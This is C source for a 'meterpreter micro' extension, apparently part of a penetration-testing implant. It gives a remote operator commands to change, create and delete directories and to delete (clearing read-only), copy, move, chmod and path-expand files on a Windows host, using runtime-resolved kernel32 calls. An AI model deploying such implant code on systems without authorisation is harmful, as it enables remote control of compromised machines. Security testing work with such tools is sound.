#include "meterpreter_micro.h"
#include "micro_runtime.h"
#include "micro_stdapi.h"

typedef BOOL(WINAPI* CopyFileWFunction)(LPCWSTR existing_file, LPCWSTR new_file, BOOL fail_if_exists);
typedef BOOL(WINAPI* CreateDirectoryWFunction)(LPCWSTR path, LPSECURITY_ATTRIBUTES attributes);
typedef BOOL(WINAPI* DeleteFileWFunction)(LPCWSTR path);
typedef BOOL(WINAPI* MoveFileWFunction)(LPCWSTR existing_file, LPCWSTR new_file);
typedef BOOL(WINAPI* RemoveDirectoryWFunction)(LPCWSTR path);
typedef BOOL(WINAPI* SetCurrentDirectoryWFunction)(LPCWSTR path);
typedef DWORD(WINAPI* GetFileAttributesWFunction)(LPCWSTR path);
typedef BOOL(WINAPI* SetFileAttributesWFunction)(LPCWSTR path, DWORD attributes);
typedef DWORD(WINAPI* ExpandEnvironmentStringsWFunction)(LPCWSTR source, LPWSTR destination, DWORD size);

static MetApi* operations_api;

static DWORD operations_transmit(Remote* remote, Packet* packet, DWORD result)
{
	Packet* response = operations_api->packet.create_response(packet);
	if (response == NULL)
	{
		return ERROR_NOT_ENOUGH_MEMORY;
	}
	return operations_api->packet.transmit_response(result, remote, response);
}

static wchar_t* operations_path(Packet* packet, DWORD type)
{
	const char* path = operations_api->packet.get_tlv_value_string(packet, type);
	return path == NULL ? NULL : micro_utf8_to_wide(operations_api, path);
}

static DWORD operations_chdir(Remote* remote, Packet* packet)
{
	SetCurrentDirectoryWFunction set_current_directory = (SetCurrentDirectoryWFunction)micro_resolve(operations_api, "kernel32.dll", "SetCurrentDirectoryW");
	wchar_t* path = operations_path(packet, TLV_TYPE_DIRECTORY_PATH);
	DWORD result = ERROR_SUCCESS;
	if (path == NULL)
	{
		result = ERROR_INVALID_PARAMETER;
	}
	else if (set_current_directory == NULL)
	{
		result = ERROR_PROC_NOT_FOUND;
	}
	else if (!set_current_directory(path))
	{
		result = micro_last_error();
	}
	micro_free(operations_api, path);
	return operations_transmit(remote, packet, result);
}

static DWORD operations_mkdir(Remote* remote, Packet* packet)
{
	CreateDirectoryWFunction create_directory = (CreateDirectoryWFunction)micro_resolve(operations_api, "kernel32.dll", "CreateDirectoryW");
	wchar_t* path = operations_path(packet, TLV_TYPE_DIRECTORY_PATH);
	DWORD result = ERROR_SUCCESS;
	if (path == NULL)
	{
		result = ERROR_INVALID_PARAMETER;
	}
	else if (create_directory == NULL)
	{
		result = ERROR_PROC_NOT_FOUND;
	}
	else if (!create_directory(path, NULL))
	{
		result = micro_last_error();
		if (result == ERROR_ALREADY_EXISTS)
		{
			result = ERROR_SUCCESS;
		}
	}
	micro_free(operations_api, path);
	return operations_transmit(remote, packet, result);
}

static DWORD operations_delete_dir(Remote* remote, Packet* packet)
{
	RemoveDirectoryWFunction remove_directory = (RemoveDirectoryWFunction)micro_resolve(operations_api, "kernel32.dll", "RemoveDirectoryW");
	wchar_t* path = operations_path(packet, TLV_TYPE_DIRECTORY_PATH);
	DWORD result = ERROR_SUCCESS;
	if (path == NULL)
	{
		result = ERROR_INVALID_PARAMETER;
	}
	else if (remove_directory == NULL)
	{
		result = ERROR_PROC_NOT_FOUND;
	}
	else if (!remove_directory(path))
	{
		result = micro_last_error();
	}
	micro_free(operations_api, path);
	return operations_transmit(remote, packet, result);
}

static DWORD operations_delete_file(Remote* remote, Packet* packet)
{
	DeleteFileWFunction delete_file = (DeleteFileWFunction)micro_resolve(operations_api, "kernel32.dll", "DeleteFileW");
	GetFileAttributesWFunction get_attributes = (GetFileAttributesWFunction)micro_resolve(operations_api, "kernel32.dll", "GetFileAttributesW");
	SetFileAttributesWFunction set_attributes = (SetFileAttributesWFunction)micro_resolve(operations_api, "kernel32.dll", "SetFileAttributesW");
	wchar_t* path = operations_path(packet, TLV_TYPE_FILE_PATH);
	DWORD result = ERROR_SUCCESS;
	if (path == NULL)
	{
		result = ERROR_INVALID_PARAMETER;
	}
	else if (delete_file == NULL)
	{
		result = ERROR_PROC_NOT_FOUND;
	}
	else
	{
		DWORD attributes = get_attributes == NULL ? INVALID_FILE_ATTRIBUTES : get_attributes(path);
		if (attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_READONLY) != 0 && set_attributes != NULL)
		{
			set_attributes(path, attributes & ~FILE_ATTRIBUTE_READONLY);
		}
		if (!delete_file(path))
		{
			result = micro_last_error();
		}
	}
	micro_free(operations_api, path);
	return operations_transmit(remote, packet, result);
}

static DWORD operations_copy(Remote* remote, Packet* packet)
{
	CopyFileWFunction copy_file = (CopyFileWFunction)micro_resolve(operations_api, "kernel32.dll", "CopyFileW");
	wchar_t* source = operations_path(packet, TLV_TYPE_FILE_NAME);
	wchar_t* destination = operations_path(packet, TLV_TYPE_FILE_PATH);
	DWORD result = ERROR_SUCCESS;
	if (source == NULL || destination == NULL)
	{
		result = ERROR_INVALID_PARAMETER;
	}
	else if (copy_file == NULL)
	{
		result = ERROR_PROC_NOT_FOUND;
	}
	else if (!copy_file(source, destination, FALSE))
	{
		result = micro_last_error();
	}
	micro_free(operations_api, destination);
	micro_free(operations_api, source);
	return operations_transmit(remote, packet, result);
}

static DWORD operations_move(Remote* remote, Packet* packet)
{
	MoveFileWFunction move_file = (MoveFileWFunction)micro_resolve(operations_api, "kernel32.dll", "MoveFileW");
	wchar_t* source = operations_path(packet, TLV_TYPE_FILE_NAME);
	wchar_t* destination = operations_path(packet, TLV_TYPE_FILE_PATH);
	DWORD result = ERROR_SUCCESS;
	if (source == NULL || destination == NULL)
	{
		result = ERROR_INVALID_PARAMETER;
	}
	else if (move_file == NULL)
	{
		result = ERROR_PROC_NOT_FOUND;
	}
	else if (!move_file(source, destination))
	{
		result = micro_last_error();
	}
	micro_free(operations_api, destination);
	micro_free(operations_api, source);
	return operations_transmit(remote, packet, result);
}

static DWORD operations_chmod(Remote* remote, Packet* packet)
{
	GetFileAttributesWFunction get_attributes = (GetFileAttributesWFunction)micro_resolve(operations_api, "kernel32.dll", "GetFileAttributesW");
	SetFileAttributesWFunction set_attributes = (SetFileAttributesWFunction)micro_resolve(operations_api, "kernel32.dll", "SetFileAttributesW");
	wchar_t* path = operations_path(packet, TLV_TYPE_FILE_PATH);
	DWORD mode = operations_api->packet.get_tlv_value_uint(packet, TLV_TYPE_FILE_MODE_T);
	DWORD result = ERROR_SUCCESS;
	if (path == NULL)
	{
		result = ERROR_INVALID_PARAMETER;
	}
	else if (get_attributes == NULL || set_attributes == NULL)
	{
		result = ERROR_PROC_NOT_FOUND;
	}
	else
	{
		DWORD attributes = get_attributes(path);
		if (attributes == INVALID_FILE_ATTRIBUTES)
		{
			result = micro_last_error();
		}
		else
		{
			attributes = (mode & 0222) != 0 ? attributes & ~FILE_ATTRIBUTE_READONLY : attributes | FILE_ATTRIBUTE_READONLY;
			if (!set_attributes(path, attributes))
			{
				result = micro_last_error();
			}
		}
	}
	micro_free(operations_api, path);
	return operations_transmit(remote, packet, result);
}

static DWORD operations_expand(Remote* remote, Packet* packet)
{
	ExpandEnvironmentStringsWFunction expand_environment = (ExpandEnvironmentStringsWFunction)micro_resolve(operations_api, "kernel32.dll", "ExpandEnvironmentStringsW");
	Packet* response = operations_api->packet.create_response(packet);
	wchar_t* path = operations_path(packet, TLV_TYPE_FILE_PATH);
	wchar_t* expanded = NULL;
	char* result_path = NULL;
	DWORD result = ERROR_SUCCESS;
	if (response == NULL || path == NULL)
	{
		result = ERROR_INVALID_PARAMETER;
	}
	else if (expand_environment == NULL)
	{
		result = ERROR_PROC_NOT_FOUND;
	}
	else
	{
		DWORD required = expand_environment(path, NULL, 0);
		expanded = required == 0 ? NULL : (wchar_t*)micro_alloc(operations_api, (SIZE_T)required * sizeof(wchar_t));
		if (expanded == NULL || expand_environment(path, expanded, required) == 0)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
		}
		else
		{
			result_path = micro_wide_to_utf8(operations_api, expanded);
			if (result_path == NULL)
			{
				result = ERROR_NOT_ENOUGH_MEMORY;
			}
			else
			{
				operations_api->packet.add_tlv_string(response, TLV_TYPE_FILE_PATH, result_path);
			}
		}
	}
	result = response == NULL ? result : operations_api->packet.transmit_response(result, remote, response);
	micro_free(operations_api, result_path);
	micro_free(operations_api, expanded);
	micro_free(operations_api, path);
	return result;
}

static DWORD operations_separator(Remote* remote, Packet* packet)
{
	Packet* response = operations_api->packet.create_response(packet);
	DWORD result = response == NULL ? ERROR_NOT_ENOUGH_MEMORY : ERROR_SUCCESS;
	if (response != NULL)
	{
		operations_api->packet.add_tlv_string(response, TLV_TYPE_STRING, "\\");
		result = operations_api->packet.transmit_response(result, remote, response);
	}
	return result;
}

#define OPERATIONS_INLINE(name) static BOOL name##_inline(Remote* remote, Packet* packet, DWORD* result) { *result = name(remote, packet); return TRUE; }
OPERATIONS_INLINE(operations_chdir)
OPERATIONS_INLINE(operations_chmod)
OPERATIONS_INLINE(operations_delete_dir)
OPERATIONS_INLINE(operations_delete_file)
OPERATIONS_INLINE(operations_copy)
OPERATIONS_INLINE(operations_expand)
OPERATIONS_INLINE(operations_move)
OPERATIONS_INLINE(operations_mkdir)
OPERATIONS_INLINE(operations_separator)

static Command operations_commands[] =
{
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_FS_CHDIR, operations_chdir_inline),
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_FS_CHMOD, operations_chmod_inline),
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_FS_DELETE_DIR, operations_delete_dir_inline),
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_FS_DELETE_FILE, operations_delete_file_inline),
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_FS_FILE_COPY, operations_copy_inline),
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_FS_FILE_EXPAND_PATH, operations_expand_inline),
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_FS_FILE_MOVE, operations_move_inline),
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_FS_MKDIR, operations_mkdir_inline),
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_FS_SEPARATOR, operations_separator_inline),
	COMMAND_TERMINATOR
};

static MicroExtension operations_extension =
{
	sizeof(MicroExtension), MICRO_EXTENSION_ABI_VERSION, "micro-stdapi-fs-operations", 9, operations_commands, MICRO_EXTENSION_FLAG_INLINE_HANDLERS
};

const MicroExtension* micro_init(MetApi* api, Remote* remote)
{
	(void)remote;
	if (api == NULL || api->packet.create_response == NULL || api->packet.get_tlv_value_string == NULL || api->packet.get_tlv_value_uint == NULL || api->packet.add_tlv_string == NULL || api->packet.transmit_response == NULL)
	{
		return NULL;
	}
	operations_api = api;
	return &operations_extension;
}

DWORD micro_deinit(Remote* remote)
{
	(void)remote;
	operations_api = NULL;
	return ERROR_SUCCESS;
}
